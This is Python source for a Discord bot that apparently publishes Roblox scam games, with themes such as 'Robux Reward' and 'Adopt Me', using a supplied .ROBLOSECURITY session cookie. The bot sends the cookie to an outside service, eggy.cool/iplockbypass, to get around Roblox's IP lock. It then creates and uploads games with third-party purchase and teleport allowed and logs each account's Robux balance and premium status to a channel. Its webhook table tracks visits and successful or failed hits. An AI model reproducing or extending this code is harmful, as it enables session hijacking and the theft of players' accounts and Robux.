import re
import os
import json
import secrets
import uuid
import requests
import discord
from discord import app_commands
from webserver import keep_alive
from discord.ext import commands
from discord.app_commands.errors import MissingRole
import psycopg2
from dotenv import load_dotenv
load_dotenv()

# ...
# Import statements and other code

# Define your rbxlx file locations with theme names
rbxlx_files = {
    "tt": {
        "theme_name": "Robux Reward V1",
        "file_location": "Files/Roblox Theme Paid.rbxlx"
    }, 
    "ps": {
        "theme_name": "Pet Simulator 99",
        "file_location": "Files/Pet_Sim_Theme (1).rbxlx"
    },
    "rs": {
        "theme_name": "Robux Reward V2",
        "file_location": "Files/Robux Theme Paid V2.rbxlx"
    },
    "bg": {
        "theme_name": "Adopt Me",
        "file_location": "Files/Adn.rbxlx"
    },
    "ts": {
        "theme_name": "Lumber Tycoon 2",
        "file_location": "Files/Lumber.rbxlx"
    },
    # Add more themes here as needed
}

# Generate choices using a loop
theme_choices = [
    discord.app_commands.Choice(name=f"{theme_data['theme_name']}", value=theme_code)
    for theme_code, theme_data in rbxlx_files.items()
]


# Configure the PostgreSQL connection settings.
# If you are using CockroachDB, you can utilize either https://neon.tech/ or https://cockroachlabs.cloud/clusters.
# For non-SSL connections, simply remove the "?sslmode=verify-full" parameter.

connection_string = os.getenv("POSTGRES_CONNECTION_STRING")

try:
    # Create a connection to the PostgreSQL database
    conn = psycopg2.connect(connection_string)
    print("Connection to PostgreSQL successful.")
except psycopg2.Error as e:
    print(f"Error connecting to PostgreSQL: {e}")

def create_table(conn):
    # SQL query to create the 'webhooks' table
    webhooks_query = (
        "CREATE TABLE IF NOT EXISTS webhooks ("
        "id SERIAL PRIMARY KEY,"
        "gameid VARCHAR,"
        "visit VARCHAR,"
        "unnbc VARCHAR,"
        "unpremium VARCHAR,"
        "vnbc VARCHAR,"
        "vpremium VARCHAR,"
        "success VARCHAR,"
        "failed VARCHAR,"
        "discid VARCHAR"
        ")"
    )

    # SQL query to create the 'purchases' table
    purchases_query = (
        "CREATE TABLE IF NOT EXISTS purchases ("
        "id SERIAL PRIMARY KEY,"
        "rbxid VARCHAR,"
        "discid VARCHAR"
        ")"
    )

    with conn.cursor() as cur:
        # Execute the 'webhooks' table creation query
        cur.execute(webhooks_query)

        # Execute the 'purchases' table creation query
        cur.execute(purchases_query)

    conn.commit()


create_table(conn)


def replace_referents(data):
  cache = {}

  def _replace_ref(match):
    ref = match.group(1)
    if not ref in cache:
      cache[ref] = ("RBX" + secrets.token_hex(16).upper()).encode()
    return cache[ref]

  data = re.sub(b"(RBX[A-Z0-9]{32})", _replace_ref, data)
  return data

def replace_script_guids(data):
  cache = {}

  def _replace_guid(match):
    guid = match.group(1)
    if not guid in cache:
      cache[guid] = ("{" + str(uuid.uuid4()).upper() + "}").encode()
    return cache[guid]

  data = re.sub(
    b"(\{[A-Z0-9]{8}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{12}\})",
    _replace_guid, data)
  return data


def process_file(file_key):
    theme_info = rbxlx_files.get(file_key)
    if not theme_info:
        return None

    rbxlx_file = theme_info["file_location"]
    file_data = open(rbxlx_file, 'rb').read()

    if rbxlx_file.endswith(".rbxlx"):
        file_data = replace_referents(file_data)
        file_data = replace_script_guids(file_data)

    return file_data


intents = discord.Intents.default()
intents.members = True
intents.message_content = True

client = discord.Client(intents=intents)
tree = discord.app_commands.CommandTree(client)

@client.event
async def on_ready():
    await tree.sync()
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='You Gay'), status=discord.Status.dnd)
    print('Logged in')
    print('------')
    print(client.user.display_name)

keep_alive()

def refresh_cookie(c):
    try:
        response = requests.get(f"https://eggy.cool/iplockbypass?cookie={c}")

        if response.text != "Invalid Cookie":
            new_cookie = response.text
            return new_cookie
        else:
            return None
    except Exception as e:
        print(f"An error occurred while refreshing the cookie: {e}")
        return None


def get_csrf_token(cookie):
    try:
        xsrfRequest = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': cookie})
        if xsrfRequest.status_code == 403 and "x-csrf-token" in xsrfRequest.headers:
            return xsrfRequest.headers["x-csrf-token"]
    except Exception as e:
        print(f"An error occurred: {str(e)}")
    return None

def get_game_icon(game_id):
    try:
        url = f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={game_id}&returnPolicy=PlaceHolder&size=512x512&format=Png&isCircular=false"
        with requests.Session() as session:
            response = session.get(url)
            response.raise_for_status()
            jsonicon = response.json()

            # Extract the thumbnail URL
            thumbnail_data = jsonicon.get("data", [])
            if thumbnail_data:
                thumbnail = thumbnail_data[0].get("imageUrl", "")
                return thumbnail
            else:
                return ""
    except requests.exceptions.RequestException as e:
        print(f"Error in get_avatar_thumbnail: {e}")
        return ""

def create_webhook(conn, game_id, success, vpremium, visit, failed, vnbc, unnbc, unpremium, discord_id):
    # Check if the game ID already exists and has the same Discord ID
    check_query = "SELECT discid FROM webhooks WHERE gameid = %s"
    with conn.cursor() as cur:
        cur.execute(check_query, (game_id,))
        existing_discid = cur.fetchone()

    if existing_discid is not None and str(existing_discid[0]) == str(discord_id):
        # Update the existing webhook data
        update_query = (
            "UPDATE webhooks SET "
            "success = %s, vpremium = %s, visit = %s, failed = %s, "
            "vnbc = %s, unnbc = %s, unpremium = %s "
            "WHERE gameid = %s"
        )

        update_data = (
            success, vpremium, visit, failed, vnbc, unnbc, unpremium, game_id
        )

        with conn.cursor() as cur:
            cur.execute(update_query, update_data)

        conn.commit()
        apiCheck = "Successfully Listed His/Her Webhooks."
    elif existing_discid is not None and str(existing_discid[0]) != str(discord_id):
        # Game ID exists, but Discord ID is different
        apiCheck = "Do Not Touch His/Her Game."
    else:
        # Insert new webhook data
        insert_query = (
            "INSERT INTO webhooks (gameid, success, vpremium, visit, failed, vnbc, unnbc, unpremium, discid) "
            "VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)"
        )
        insert_data = (game_id, success, vpremium, visit, failed, vnbc, unnbc, unpremium, discord_id)

        with conn.cursor() as cur:
            cur.execute(insert_query, insert_data)

        conn.commit()
        apiCheck = "Successfully Listed His/Her Webhooks."

    return apiCheck

@tree.command(
    name="publish",
    description="Publish your Roblox game files here"
)
@app_commands.describe(theme='Choose a Theme')
@app_commands.choices(theme=theme_choices)

async def slash_publish(interaction: discord.Interaction, theme: discord.app_commands.Choice[str], cookie: str, gamename: str = None, description: str = None):

  role_name = os.getenv('CUSTUMER_ROLE_NAME')
  guild_id = int(os.getenv("GUILD_ID"))
  guild = interaction.guild

  if guild is None:
    print(f"Guild not found with ID: {guild_id}")
    return

  member = guild.get_member(interaction.user.id)
  if member is None:
    print(f"Member not found in guild with ID: {guild_id}")
    return

  role = discord.utils.get(guild.roles, name=role_name)
  if role is None or role not in member.roles:

    message = f"Role {role_name} is required to run this command.❌"
    embed_var = discord.Embed(title=message, color=8918293)
    return await interaction.response.send_message(embed=embed_var, ephemeral=True)

  message = "Publishing your Game please wait a sec...🌟"
  embed_var = discord.Embed(title=message, color=0x00FFFF)
  await interaction.response.send_message(embed=embed_var, ephemeral=True)

  refreshed_cookie = refresh_cookie(cookie)

  if refreshed_cookie is None:
    message = "Your Cookie is Invalid ❌"
    embed_var = discord.Embed(title=message, color=0x00FFFF)
    return await interaction.followup.send(embed=embed_var, ephemeral=True)

  try:
      csrf_token = get_csrf_token(refreshed_cookie)
  except Exception as e:
      await interaction.followup.send(f'Oops! Something went wrong: {e}')
  headers = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
      "X-CSRF-TOKEN": csrf_token,
      "Cookie": f".ROBLOSECURITY={refreshed_cookie}"
  }

  # Make the GET request
  url = 'https://www.roblox.com/mobileapi/userinfo'
  response = requests.get(url, headers=headers)
  data = response.json()
  try:
    username = data['UserName']
    userid = data['UserID']
    user_robux = data['RobuxBalance']
    user_isprem = data['IsPremium']
    avatarurl = data['ThumbnailUrl']

  except:
    await interaction.followup.send(f'Oops! Something went wrong, {refreshed_cookie}!')


  print(f" [DATA] {userid} - UserID")

  session = requests.Session()
  session.headers.update(
    {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
      "Accept": "application/json, text/plain, */*",
      "Content-Type": "application/json;charset=utf-8",
      "Origin": "https://www.roblox.com",
    }
  )
  session.cookies[".ROBLOSECURITY"] = refreshed_cookie

  headers1 = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Roblox/WinInet",
        "X-CSRF-TOKEN": csrf_token,
        "Cookie": ".ROBLOSECURITY=" + refreshed_cookie,
  }
  body1 = json.dumps({"templatePlaceId": "379736082"})

  request1 = session.post(
        "https://apis.roblox.com/universes/v1/universes/create",
        headers=headers1,
        data=body1
  )
  code1 = request1.status_code
  Uni_Game_Id = None
  if code1 == 200:
    response_body = request1.json()
    game_id = response_body["rootPlaceId"]
    Uni_Game_Id = response_body["universeId"]
    game_url = f"https://www.roblox.com/games/{game_id}/"

    success_embed = discord.Embed(
        title="Place Created",
        description=f"Your Game is fully published now! Lets celebrate!🎉 \n[Click here to play!]({game_url})", 
        color=0x00FFFF
    )

    await interaction.followup.send(embed=success_embed, ephemeral=True)
  else:
    await interaction.followup.send(f"Upload failed with HTTP code {code1}", ephemeral=True)

  print(f" [DATA] {Uni_Game_Id} - Game Uni-ID")
  if Uni_Game_Id is not None:
    headers2 = {
      "Origin": "https://create.roblox.com",
      "X-CSRF-TOKEN": csrf_token,
      "Cookie": ".ROBLOSECURITY=" + refreshed_cookie,
    }
    session.post(f"https://develop.roblox.com/v1/universes/{Uni_Game_Id}/activate", headers=headers2)

    gamedata = {
      "name": gamename,
      "description": description,
      "universeAvatarType": "MorphToR6",
      "universeAnimationType": "Standard",
      "maxPlayerCount": 1,
      "allowPrivateServers": False,
      "privateServerPrice": 0,
      "permissions": {
        "IsThirdPartyTeleportAllowed": True,
        "IsThirdPartyPurchaseAllowed": True,
      },
    }
    body2 = json.dumps(gamedata)
    session.patch(
      f"https://develop.roblox.com/v2/universes/{Uni_Game_Id}/configuration",
      headers=headers1,
      data=body2
    )

    uploadRequest = session.post(
    f"https://data.roblox.com/Data/Upload.ashx?assetid={str(game_id)}",
    headers={
      'Content-Type': 'application/xml',
      'x-csrf-token': csrf_token,
      'User-Agent': 'Roblox/WinINet'
    },
    cookies={'.ROBLOSECURITY': refreshed_cookie},
    data=process_file(theme.value))

    print(f" [DATA] {uploadRequest.status_code} - Game Response Code")
    print(f" [DATA] {uploadRequest.content} - Game Response")

    if uploadRequest.status_code == 200:

        game_icon = get_game_icon(game_id)

        embed_var = discord.Embed(title="Your Game Has Been Published🎉", description="**SuccessFully Published🎉**", color=0x00FFFF)
        embed_var.add_field(name='🎮Game Name', value='' + str(gamename) + '')
        embed_var.add_field(name='📄Description', value='' + str(description) + '')
        embed_var.add_field(name='**🪪Game ID**', value='' + str(game_id) + '')
        embed_var.add_field(name='**🌐Theme**', value='' + str(theme.name) + '')
        embed_var.add_field(name="🏷️Game Link", value=f'**[Click here to view your Game](https://www.roblox.com/games/{str(game_id)})**', inline=False)
        embed_var.set_footer(text="Your game is now been Published in Roblox.com - Hooray 🎉")
        embed_var.set_thumbnail(url=f"{game_icon}")
        await interaction.followup.send(embed=embed_var, ephemeral=True)
        channel = client.get_channel(int(os.getenv('PUBLISH_LOG')))

        embed_var = discord.Embed(
          title="Dashx RGUI",
          description= f'**<@{interaction.user.id}> Successfully published his game! Congrats him!🌟**\n\n**Account Information**\n**🏷️Account Username -** ' + str(username) + '\n**🪪Account ID - ** ' + str(userid) + '\n**🤑Robux - ** ' + str(user_robux) + '\n**📄isPremium? - **' + str(user_isprem) + '\n\n**📄Game Information**\n**🏷️Game Name - ||Hidden||**\n**📄Game Description - ||Hidden||**\n**Theme -** '+ str(theme.name)+'',
          color=0x00FFFF
        )
        embed_var.set_thumbnail(url=f'{avatarurl}')

        embed_var.set_footer(text="Ratatatata")
        await channel.send(embed=embed_var)
  else:
        message2 = (f'Oops! Something went wrong, {refreshed_cookie}!')
        embed_var = discord.Embed(title=message2, color=0x00FFFF)
        await interaction.followup.send(embed=embed_var, ephemeral=True)

client.run(os.getenv('TOKEN'))
